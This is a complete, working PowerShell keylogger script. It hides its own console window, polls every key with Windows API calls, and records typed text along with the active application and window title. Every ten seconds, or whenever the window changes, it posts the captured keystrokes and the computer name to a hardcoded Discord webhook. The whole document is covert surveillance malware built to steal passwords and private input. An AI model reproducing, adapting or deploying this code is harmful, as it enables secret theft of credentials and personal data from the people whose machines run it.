# ================= CONFIG =================
$WEBHOOK_URL = "https://discord.com/api/webhooks/1442666694165135391/2B1EGQkG94a4swTJimgjXodryz5BxiT0SuTo7Y6s9XnZTvjLQdkd7Qyu3YTox9MKtMXW"
$SEND_INTERVAL_SECONDS = 10
$COLORS = @(3447003,15844367,3066993,15105570,10181046,9807270,15277667,1146986,2067276,2123412)
$colorIndex = 0

# ================= HIDE WINDOW =================
$hideCode = @'
[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
[DllImport("user32.dll")] public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
[DllImport("user32.dll")] public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
'@
$hideAPI = Add-Type -MemberDefinition $hideCode -Name 'Win32Hide' -Namespace 'Hide' -PassThru
$mainWindow = (Get-Process -Id $pid).MainWindowHandle
if ($mainWindow -ne [IntPtr]::Zero) {
    $hideAPI::ShowWindowAsync($mainWindow, 0) | Out-Null
    $style = $hideAPI::GetWindowLong($mainWindow, -20)
    $hideAPI::SetWindowLong($mainWindow, -20, $style -bor 0x00000080) | Out-Null
}

# ================= KEYBOARD API =================
$keyboardCode = @'
[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
[DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll")] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
[DllImport("user32.dll")] public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll")] public static extern int GetWindowThreadProcessId(IntPtr hWnd, out int lpdwProcessId);
[DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);
'@
$kbAPI = Add-Type -MemberDefinition $keyboardCode -Name 'Keyboard' -Namespace 'Win32' -PassThru

# ================= UTILITIES =================
function Get-ActiveWindow {
    $hwnd = $kbAPI::GetForegroundWindow()
    if ($hwnd -eq [IntPtr]::Zero) { return @{ Process = "Unknown"; Title = "" } }
    
    $pidOut = 0
    $null = $kbAPI::GetWindowThreadProcessId($hwnd, [ref]$pidOut)
    $procName = "Unknown"
    if ($pidOut -gt 0) {
        $proc = Get-Process -Id $pidOut -ErrorAction SilentlyContinue
        if ($proc) { $procName = $proc.ProcessName }
    }
    
    $sb = New-Object System.Text.StringBuilder 256
    $null = $kbAPI::GetWindowText($hwnd, $sb, 256)
    return @{ Process = $procName; Title = $sb.ToString() }
}

function Send-ToDiscord {
    param($cleanText, $rawText, $windowInfo)
    
    $cleanText = $cleanText.Trim()
    $rawText = $rawText.Trim()
    
    if ($cleanText.Length -eq 0 -and $rawText.Length -eq 0) { return }
    
    # Trim if too long
    if ($cleanText.Length -gt 1000) { $cleanText = $cleanText.Substring(0, 1000) + "..." }
    if ($rawText.Length -gt 1000) { $rawText = $rawText.Substring(0, 1000) + "..." }
    
    $timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
    $footerText = "$env:COMPUTERNAME | $(Get-Date -Format 'MM/dd/yyyy HH:mm:ss')"
    
    $color = $COLORS[$global:colorIndex % $COLORS.Length]
    $global:colorIndex++
    
    $embed = @{
        title = "Keystroke Log"
        description = "**Session Data** | **Stats Below**"
        color = $color
        timestamp = $timestamp
        fields = @(
            @{
                name = "Application"
                value = "Process: **$($windowInfo.Process)**`nWindow: $($windowInfo.Title)"
                inline = $true
            },
            @{
                name = "Processed Text"
                value = "```$cleanText```"
                inline = $false
            },
            @{
                name = "Raw Data"
                value = "```$rawText```"
                inline = $false
            },
            @{
                name = "Statistics"
                value = "Clean: $($cleanText.Length) chars`nRaw: $($rawText.Length) chars"
                inline = $true
            }
        )
        footer = @{ text = $footerText }
    }
    
    $payload = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10 -Compress
    try {
        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
    } catch { Write-Host "[!] Webhook failed: $_" -f Red }
}

# ================= MAIN LOGIC =================
$bufferClean = ""
$bufferRaw = ""
$lastWindow = Get-ActiveWindow
$lastSendTime = [System.Diagnostics.Stopwatch]::StartNew()
$pressedKeys = @{}

# Key mappings
$specialKeys = @{
    8 = "[BACK]"; 9 = "[TAB]"; 13 = "[ENTER]"; 27 = "[ESC]"; 32 = " "
    33 = "[PGUP]"; 34 = "[PGDN]"; 35 = "[END]"; 36 = "[HOME]"
    37 = "[LEFT]"; 38 = "[UP]"; 39 = "[RIGHT]"; 40 = "[DOWN]"
    45 = "[INS]"; 46 = "[DEL]"; 91 = "[WIN]"; 92 = "[RWIN]"
    112 = "[F1]"; 113 = "[F2]"; 114 = "[F3]"; 115 = "[F4]"
    116 = "[F5]"; 117 = "[F6]"; 118 = "[F7]"; 119 = "[F8]"
    120 = "[F9]"; 121 = "[F10]"; 122 = "[F11]"; 123 = "[F12]"
    144 = "[NUMLOCK]"; 145 = "[SCROLL]"
    16 = ""; 17 = ""; 18 = "" # Shift, Ctrl, Alt - handled as modifiers
}

while ($true) {
    Start-Sleep -Milliseconds 5
    
    # Get modifier states
    $shift = ($kbAPI::GetAsyncKeyState(16) -lt 0)
    $ctrl = ($kbAPI::GetAsyncKeyState(17) -lt 0)
    $alt = ($kbAPI::GetAsyncKeyState(18) -lt 0)
    $win = ($kbAPI::GetAsyncKeyState(91) -lt 0) -or ($kbAPI::GetAsyncKeyState(92) -lt 0)
    
    # Check all keys
    for ($vk = 8; $vk -le 254; $vk++) {
        $state = $kbAPI::GetAsyncKeyState($vk)
        
        # Key pressed down
        if ($state -eq -32767) {
            $isModifier = ($vk -eq 16 -or $vk -eq 17 -or $vk -eq 18 -or $vk -eq 91 -or $vk -eq 92)
            
            # Build modifier string
            $mods = @()
            if ($ctrl) { $mods += "CTRL" }
            if ($shift) { $mods += "SHIFT" }
            if ($alt) { $mods += "ALT" }
            if ($win) { $mods += "WIN" }
            $modString = if ($mods.Count -gt 0) { "[" + ($mods -join "+") + "+" }
            
            # Get key representation
            $keyText = ""
            if ($specialKeys.ContainsKey($vk)) {
                $keyText = $specialKeys[$vk]
            } else {
                $scan = $kbAPI::MapVirtualKey($vk, 3)
                $kbState = New-Object byte[] 256
                $null = $kbAPI::GetKeyboardState($kbState)
                $sb = New-Object System.Text.StringBuilder 10
                if ($kbAPI::ToUnicode($vk, $scan, $kbState, $sb, $sb.Capacity, 0) -gt 0) {
                    $keyText = $sb.ToString()
                }
            }
            
            # Skip empty modifiers
            if ($isModifier -and $keyText -eq "") { continue }
            
            # Add to buffers
            if ($keyText -ne "") {
                # Raw buffer
                if ($modString) {
                    $bufferRaw += "$modString$keyText]"
                } else {
                    $bufferRaw += $keyText
                }
                
                # Clean buffer (ignore special keys except backspace)
                if ($vk -eq 8) { # Backspace
                    if ($bufferClean.Length -gt 0) {
                        $bufferClean = $bufferClean.Substring(0, $bufferClean.Length - 1)
                    }
                } elseif (-not $isModifier -and $keyText.Length -eq 1) {
                    $bufferClean += $keyText
                }
            }
        }
    }
    
    # Check window change or time interval
    $currentWindow = Get-ActiveWindow
    $windowChanged = ($currentWindow.Process -ne $lastWindow.Process) -or ($currentWindow.Title -ne $lastWindow.Title)
    
    if ($windowChanged -or $lastSendTime.Elapsed.TotalSeconds -ge $SEND_INTERVAL_SECONDS) {
        if ($bufferRaw.Length -gt 0 -or $bufferClean.Length -gt 0) {
            Send-ToDiscord -cleanText $bufferClean -rawText $bufferRaw -windowInfo $lastWindow
            $bufferClean = ""
            $bufferRaw = ""
        }
        $lastWindow = $currentWindow
        $lastSendTime.Restart()
    }
}
